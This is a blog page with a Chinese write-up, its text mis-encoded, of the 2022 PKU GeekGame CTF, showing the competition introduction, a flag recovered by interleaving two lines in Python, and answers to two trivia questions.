<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="CTF | 2022 PKU GeekGame 2nd WriteUp, MiaoTony,blog">
    <meta name="description" content="ç¬¬äºŒå±ŠPKU GeekGameæ¥äº†ï¼Œä»Šå¹´è¿™ä¸ªæ—¶é—´æ®µäº‹æƒ…æ¯”è¾ƒå¤šæ²¡å•¥æ—¶é—´æ‰“ï¼Œå†åŠ ä¸Šæ¯”èµ›é¢˜ç›®çš„éš¾åº¦ä¹Ÿä¸å°ï¼Œåªèƒ½åœ¨ç»“æŸä¹‹å‰å‹‰å¼ºä¸Šä¸ªæ€»æ¦œäº†â€¦â€¦">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159946730-1"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }

    gtag('js', new Date());
    gtag('config', 'UA-159946730-1');
</script>


    <title>CTF | 2022 PKU GeekGame 2nd WriteUp | MiaoTony&#39;så°çª</title>
    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
	
    <script src="/libs/jquery/jquery.min.js"></script>
    <script>
        //æ¥ä¸ªç‰¹æ•ˆç©ç©å–µ 20200123
        var titleTime;
        var OriginTitile = document.title;
        document.addEventListener('visibilitychange', function() {
            if (document.hidden) {
                document.title = '|Ï‰Â·) å–µ~å¿«å›æ¥å‘€ï¼';
                clearTimeout(titleTime);
            } else {
                document.title = '(/â‰§â–½â‰¦)/ Meowï¼';
                titleTime = setTimeout(function() {
        	    document.title = OriginTitile;
        }, 800);
    }
        });
    </script>
<meta name="generator" content="Hexo 6.2.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
<link rel="alternate" href="/atom.xml" title="MiaoTony'så°çª" type="application/atom+xml">
</head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">MiaoTony&#39;så°çª</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>é¦–é¡µ</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>æ ‡ç­¾</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>åˆ†ç±»</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>å½’æ¡£</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>å…³äº</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>ç•™è¨€</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>å‹é“¾</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="æœç´¢" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">MiaoTony&#39;så°çª</div>
        <div class="logo-desc">
            
            å–µ~æ¬¢è¿å„ä½å¤§ä½¬çš„æ¥è®¿å‘€ï¼
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			é¦–é¡µ
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			æ ‡ç­¾
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			åˆ†ç±»
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			å½’æ¡£
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			å…³äº
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			ç•™è¨€
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			å‹é“¾
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/miaotony" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Follow Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/miaotony" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Follow Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/15.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">CTF | 2022 PKU GeekGame 2nd WriteUp</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        min-width: 240px;
        padding-left: 15px;
        padding-bottom: 30px;
    }

    .toc-widget .toc-title {
        padding: 30px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
	    max-height: 450px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- æ–‡ç« å†…å®¹è¯¦æƒ… -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/WriteUp/">
                                <span class="chip bg-color">WriteUp</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>å‘å¸ƒæ—¥æœŸ:&nbsp;&nbsp;
                    2022-11-30
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>æ–‡ç« å­—æ•°:&nbsp;&nbsp;
                    13.5k
                </div>
                

                
                <div class="info-break-policy">
                    <i class="far fa-clock fa-fw"></i>é˜…è¯»æ—¶é•¿:&nbsp;&nbsp;
                    64 åˆ†
                </div>
                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- æ˜¯å¦åŠ è½½ä½¿ç”¨è‡ªå¸¦çš„ prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221121233808589.png"></p>
<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote>
<p><strong>ç¬¬äºŒå±ŠåŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›</strong></p>
<p>2022 å¹´ 11 æœˆ 19 æ—¥ï¼ˆå‘¨å…­ï¼‰~ 26 æ—¥ï¼ˆå‘¨å…­ï¼‰</p>
<p>åŒ—äº¬å¤§å­¦ä¿¡æ¯å®‰å…¨ç»¼åˆèƒ½åŠ›ç«èµ›ï¼ˆPKU GeekGameï¼‰æ˜¯ä»¥ä¿¡æ¯å®‰å…¨ç›¸å…³çŸ¥è¯†èƒ½åŠ›ä¸ºä¸»çš„å…¥é—¨å‘ç«èµ›ï¼Œæ¯”èµ›ç›®çš„æ˜¯æ™®åŠç½‘ç»œä¸ä¿¡æ¯å®‰å…¨ç›¸å…³çŸ¥è¯†ï¼Œå¹¶é€‰æ‹”éƒ¨åˆ†ä¼˜ç§€åŒå­¦åŠ å…¥åˆ°åŒ—äº¬å¤§å­¦ CTF æˆ˜é˜Ÿã€‚ æœ¬å±Šç«èµ›å°†ç»§ç»­è¿½æ±‚<strong>é¢˜ç›®æ–°é¢–æœ‰è¶£ã€éš¾åº¦å…·æœ‰æ¢¯åº¦</strong>ï¼Œè®©æ²¡æœ‰ç›¸å…³ç»éªŒçš„æ–°ç”Ÿå’Œå…·æœ‰ä¸€å®šä¸“ä¸šåŸºç¡€çš„å­¦ç”Ÿéƒ½èƒ½äº«å—æ¯”èµ›ï¼Œåœ¨å­¦ä¹ çš„è¿‡ç¨‹ä¸­æœ‰æ‰€æ”¶è·ã€‚</p>
<p>æˆ‘ä»¬å¯¹ä¼˜èƒœè€…ç»™äºˆä¸°åšçš„æ¿€åŠ±ï¼Œå¹¶é¢å‘<strong>ç”±åŒ—äº¬å¤§å­¦è®¡ç®—ä¸­å¿ƒå’Œè®¡ç®—æœºå­¦é™¢ç­¾å‘çš„è·å¥–è¯ä¹¦</strong>ã€‚</p>
<p>é¢˜ç›®è€ƒå¯Ÿçš„å†…å®¹æ¶‰åŠåˆ°ä¿¡æ¯å®‰å…¨çš„å„ä¸ªæ–¹é¢ï¼ŒåŒ…æ‹¬èŒæ–°èƒ½æ„‰å¿«æ¢ç´¢çš„å…¥é—¨é¢˜ç›®å’Œå…·æœ‰ä¸€å®šé€‰æ‹”ä½œç”¨çš„é¢˜ç›®ï¼š</p>
<ul>
<li><strong>Misc:</strong> ç»¼åˆæŠ€èƒ½ï¼ˆå¸¸è§ç¼–ç å’Œæ–‡ä»¶æ ¼å¼ã€ä»£ç å®¡è®¡ç­‰ï¼‰</li>
<li><strong>Web:</strong> ç½‘ç«™å®‰å…¨ï¼ˆWeb æ¼æ´åˆ©ç”¨ã€JavaScript ç¼–ç¨‹ç­‰ï¼‰</li>
<li><strong>Binary:</strong> äºŒè¿›åˆ¶å®‰å…¨ï¼ˆé€†å‘å·¥ç¨‹ã€ç¨‹åºè°ƒè¯•ç­‰ï¼‰</li>
<li><strong>Algorithm:</strong> ç®—æ³•å®‰å…¨ï¼ˆç°ä»£å¯†ç å­¦ã€ç®—æ³•è®¾è®¡ç­‰ï¼‰</li>
</ul>
<p><strong>ğŸ“… èµ›ç¨‹å®‰æ’</strong></p>
<p>æ¯”èµ›æ—¶é—´ä¸ºåŒ—äº¬æ—¶é—´<strong>2022 å¹´ 11 æœˆ 19 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00 åˆ° 26 æ—¥ï¼ˆå‘¨å…­ï¼‰12:00</strong>ï¼Œå…±æŒç»­ä¸€å‘¨ã€‚ ç«èµ›ä¸ºä¸ªäººçº¿ä¸Šè§£é¢˜èµ›ï¼Œé€‰æ‰‹éœ€è¦ç‹¬ç«‹è§£å†³ä¸å®‰å…¨ç›¸å…³çš„è°œé¢˜è·å¾—ç­”æ¡ˆã€‚<strong>é€‰æ‰‹åœ¨æ¯”èµ›ç»“æŸå‰å¯ä»¥éšæ—¶ç™»å½•æœ¬å¹³å° geekgame.pku.edu.cn å‚èµ›</strong>ã€‚</p>
<p>æœ¬å±Šç«èµ›å°†åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œæ—¶é•¿åˆ†åˆ«ä¸º 5 å¤©å’Œ 2 å¤©ã€‚<strong>åœ¨ç¬¬äºŒé˜¶æ®µå°†å¯¹å¤šæ•°æˆ–å…¨éƒ¨é¢˜ç›®æ”¾å‡ºæç¤ºæˆ–é™ä½éš¾åº¦ï¼Œä½†æ˜¯å°†åªèƒ½è·å¾— 1/3 çš„åˆ†æ•°ã€‚</strong>é€šè¿‡ç¬¬äºŒé˜¶æ®µï¼Œå¸Œæœ›æ€è·¯å¡å£³çš„é€‰æ‰‹èƒ½å¤Ÿå€ŸåŠ©æç¤ºä¸ç•™é—æ†¾ï¼ŒåŒæ—¶èŒæ–°ä¹Ÿæœ‰æœºä¼šæŒ‘æˆ˜éš¾é¢˜ã€‚</p>
<p>æ ¡å†…æ’åå‰ 35 çš„é€‰æ‰‹éœ€è¦åœ¨ 27 æ—¥ï¼ˆå‘¨æ—¥ï¼‰21:00 å‰æäº¤æ¯é“è§£å‡ºé¢˜ç›®çš„è§£é¢˜æŠ¥å‘Šï¼ˆWriteupï¼‰ï¼Œå…¶ä»–é€‰æ‰‹å¯ä»¥è‡ªæ„¿æäº¤ã€‚æ¯”èµ›ç»“æŸåå°†ä¸¾åŠé¢å¥–å…¸ç¤¼ï¼Œå¹¶å…¬å¼€å®˜æ–¹ Writeup å’Œéƒ¨åˆ†ä¼˜ç§€é€‰æ‰‹ Writeupã€‚</p>
</blockquote>
<p><strong>åˆæ˜¯ä¸€å¹´ PKU GeekGameï¼</strong></p>
<blockquote>
<p>é¡ºä¾¿ï¼Œå–µå–µå»å¹´çš„ Hackergame Writeup è¯¦è§ï¼š</p>
<p><a href="https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/">CTF | 2021 PKU GeekGame 1st WriteUp</a></p>
</blockquote>
<p>ç”±äºè¦ç»™è€æ¿æ‰“å·¥æ¬ç –ã€å¿™äºå­¦æœ¯ç­‰åŸå› ï¼Œä»Šå¹´è¿™ä¸ªæ—¶é—´æ®µäº‹æƒ…æ¯”è¾ƒå¤šï¼Œå†åŠ ä¸Š GeekGame é¢˜ç›®çš„éš¾åº¦ä¹Ÿä¸å°ï¼Œæ²¡æœ‰å•¥æ•´å—çš„æ—¶é—´æ¥çœ‹é¢˜äº†ã€‚</p>
<p>è¿™ç¯‡ä¹Ÿå°±éšä¾¿çœ‹çœ‹é¢˜ï¼Œè®°å½•ä¸€ä¸‹åšé¢˜çš„è¿‡ç¨‹å§ï¼Œè¿˜æœ‰æŒºå¤šé¢˜æ²¡å•¥æ—¶é—´çœ‹äº†ï¼Œå¸ˆå‚…ä»¬å°±å½“å‚è€ƒå¥½äº†ï¼ˆ</p>
<blockquote>
<p>èµ›ååˆå¤ç°äº†ä¸‹ï¼Œæ‹–äº†ä¸€ä¸ªæœˆç»ˆäºæŠŠè¿™ä¸€ç¯‡ç»™ç³Šå®Œäº†ï¼Œå–µå‘œå–µå‘œå–µ~</p>
</blockquote>
<h2 id="Tutorial"><a href="#Tutorial" class="headerlink" title="Tutorial"></a>Tutorial</h2><h3 id="â€ ç­¾åˆ°â€ "><a href="#â€ ç­¾åˆ°â€ " class="headerlink" title="â€ ç­¾åˆ°â€ "></a>â€ ç­¾åˆ°â€ </h3><blockquote>
<p>ã€ŠPKU GeekGameã€‹æ˜¯åŒ—äº¬å¤§å­¦è‡ªä¸»ç ”å‘çš„ä¸€æ¬¾å…¨æ–° CTF è§£é¢˜èµ›ã€‚ æ¯”èµ›å‘ç”Ÿåœ¨ä¸€ä¸ªè¢«ç§°ä½œã€Œä¿¡æ¯é«˜é€Ÿè·¯äº’è”ç½‘ã€çš„å¹»æƒ³ä¸–ç•Œï¼Œ åœ¨è¿™é‡Œï¼ŒæŠ¥åçš„é€‰æ‰‹å°†è¢«æˆäºˆè®¿é—®é¢˜ç›®çš„ã€Œæƒèƒ½ã€Tokenï¼Œå¯¼å¼•èµ›åšä¹‹åŠ›ã€‚ ä½ å°†æ‰®æ¼”ä¸€ä½åä¸ºã€Œé»‘å®¢ã€çš„ç¥ç§˜è§’è‰²ï¼Œåœ¨è‡ªç”±çš„è§£é¢˜è¿‡ç¨‹ä¸­é‚‚é€…ç±»å‹å„å¼‚ã€è€ƒç‚¹ç‹¬ç‰¹çš„é¢˜ç›®ä»¬ï¼Œæ‰¾å‡ºç¨‹åºçš„æ¼æ´æˆ–è€…éšè—çš„ä¿¡æ¯ï¼ŒåŒæ—¶é€æ­¥å‘æ˜ã€ŒFlagã€çš„çœŸç›¸ã€‚</p>
</blockquote>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221121234100886.png"></p>
<p>å’Œ <a href="https://miaotony.xyz/2021/11/25/CTF_2021PKUGeekGame/#%E2%86%92%E7%AD%BE%E5%88%B0%E2%86%90">ç¬¬ä¸€å±Šçš„ç­¾åˆ°é¢˜</a> ä¸€æ ·ï¼Œç›´æ¥å¤åˆ¶ç²˜è´´è¿™æ®µå­—ç¬¦</p>
<pre class="line-numbers language-none"><code class="language-none">fa{el_lyr@ekaeV!
lgHloPaesGeGm_2}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span><span class="token triple-quoted-string string">"""fa{el_lyr@ekaeV!
... lgHloPaesGeGm_2}"""</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> ss <span class="token operator">=</span> s<span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token operator">&gt;&gt;</span><span class="token operator">&gt;</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>     <span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>ss<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
flag<span class="token punctuation">{</span>Hello_Players@GeekGame_V2!<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="å°åŒ—é—®ç­”-Â·-æé€Ÿç‰ˆ"><a href="#å°åŒ—é—®ç­”-Â·-æé€Ÿç‰ˆ" class="headerlink" title="å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆ"></a>å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆ</h3><blockquote>
<p>èœå®ååˆ†æ“…é•¿ç½‘ä¸Šå†²æµªï¼Œä¼šä½¿ç”¨åç§ç”šè‡³ä¹ç§æœç´¢å¼•æ“ã€‚æœ¬å±Š PKU GeekGame ä¸€å¼€å§‹ï¼Œå¥¹å°±æ€¥ä¸å¯è€åœ°æ‰“å¼€äº†å°åŒ—é—®ç­”é¢˜ç›®ï¼Œæƒ³è¦åœ¨ä¸€è¡€æ¦œä¸Šå±•ç°å¥¹æƒŠäººçš„æƒ…æŠ¥æœé›†èƒ½åŠ›ã€‚</p>
<p>ä¸ºäº†è®©èœå®ç©å¾—å¼€å¿ƒï¼Œå°åŒ—é—®ç­”é¢˜ç›®å…¨æ–°å‡çº§ä¸ºå°åŒ—é—®ç­” Â· æé€Ÿç‰ˆã€‚</p>
<ul>
<li>å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆè‡ªå¸¦<strong>çœæµåŠ©æ‰‹</strong>ï¼ŒåŸºäº socket é€šä¿¡çš„çº¯æ–‡å­— UI ç®€æ´æœ´å®ï¼Œä¸æµªè´¹ç½‘ç»œä¸Šçš„æ¯ä¸€æ¯«ç§’ã€‚</li>
<li>å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆè‡ªå¸¦<strong>é€Ÿé€šè®¡æ—¶</strong>ï¼Œåªæœ‰æ‰‹é€Ÿå¤Ÿå¿«çš„ CTF é€‰æ‰‹æ‰æ˜¯å¥½çš„ CTF é€‰æ‰‹ã€‚</li>
<li>å°åŒ—é—®ç­” Â· æé€Ÿç‰ˆè‡ªå¸¦<strong>è‚‰é¸½ç©æ³•</strong>ï¼Œæ¯æ¬¡è¿æ¥åˆ°é¢˜ç›®éƒ½æœ‰ä¸ä¸€æ ·çš„é—®é¢˜åœ¨ç­‰ç€ä½ ã€‚</li>
</ul>
<p>èµ¶ç´§æ‰“å¼€ç½‘é¡µç»ˆç«¯ä½“éªŒå°åŒ—é—®ç­” Â· æé€Ÿç‰ˆï¼ŒæŠŠ Flag æŠ±å›å®¶å§ï¼</p>
<p> ä½ å¯ä»¥ <a target="_blank" rel="noopener" href="https://prob01.geekgame.pku.edu.cn/?token=xxxxx">æ‰“å¼€ç½‘é¡µç»ˆç«¯</a> æˆ–è€…é€šè¿‡å‘½ä»¤ <code>nc prob01.geekgame.pku.edu.cn 10001</code> è¿æ¥åˆ°é¢˜ç›®</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">æ¬¢è¿æ¥åˆ°å°åŒ—é—®ç­”Â·æé€Ÿç‰ˆã€‚ä¸‹é¢å°†æœ‰ 7 é“é¢˜ç›®ï¼Œæ¯é“é¢˜ç›® 14 åˆ†ã€‚è¿˜æœ‰ 2 åˆ†å°†ä¼šæ ¹æ®ä½ çš„ç­”é¢˜é€Ÿåº¦ç»™å‡ºã€‚
å‡†å¤‡å¥½äº†å—ï¼Ÿè¾“å…¥â€œæ€¥æ€¥æ€¥â€å¼€å§‹ç­”é¢˜ã€‚
&gt; æ€¥æ€¥æ€¥

è®¡æ—¶å¼€å§‹ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>ç¬¬ 1 é¢˜ï¼šè®¿é—®ç½‘å€ â€œ<a target="_blank" rel="noopener" href="http://ctf.ä¸–ç•Œä¸€æµå¤§å­¦.comâ€/">http://ctf.ä¸–ç•Œä¸€æµå¤§å­¦.comâ€</a> æ—¶ï¼Œå‘è¯¥ä¸»æœºå‘é€çš„ HTTP è¯·æ±‚ä¸­ Host è¯·æ±‚å¤´çš„å€¼æ˜¯ä»€ä¹ˆï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^[^:\s]+$</code></p>
<blockquote>
<p>ctf.xnâ€“4gqwbu44czhc7w9a66k.com<br>é‰´å®šä¸ºï¼šç­”æ¡ˆæ­£ç¡®ã€‚</p>
</blockquote>
<p>ç¬¬ 2 é¢˜ï¼šåŒ—äº¬å¤§å­¦æŸå®éªŒå®¤æ›¾å¼€å‘äº†ä¸€ä¸ªå« gStore çš„æ•°æ®åº“è½¯ä»¶ã€‚æœ€æ—©æè¿°è¯¥è½¯ä»¶çš„è®ºæ–‡çš„ DOI ç¼–å·æ˜¯å¤šå°‘ï¼Ÿ<br>ç­”æ¡ˆæ ¼å¼ï¼š<code>^[\d.]+\/[\d.]+$</code></p>
<p><a target="_blank" rel="noopener" href="https://www.icst.pku.edu.cn/leizou/xm/gstore/index.htm">https://www.icst.pku.edu.cn/leizou/xm/gstore/index.htm</a></p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024650246.png"></p>
<p>Lei Zou, Jinghui Mo, Lei Chen,M. Tamer Ã–zsu, Dongyan Zhao, <a target="_blank" rel="noopener" href="https://www.icst.pku.edu.cn/leizou/docs/20181121102803399591.pdf">gStore: Answering SPARQL Queries Via Subgraph Matching</a>, Proc. VLDB 4(8): 482-493, 2011. </p>
<p><img src="/2022/11/30/CTF_2022PKUGeekGame/image-20221122024738171.png"></p>
<p><a target="_blank" rel="noopener" href="https://doi.org/10.14778/2002974.2002976">https://doi.org/10.14778/2002974.2002976</a></p>
<blockquote>
<p>10.14778/2002974.2002976<br>é‰´å®šä¸ºï¼šç­”æ¡ˆæ­£ç¡®ã€‚</p>
</blockquote>
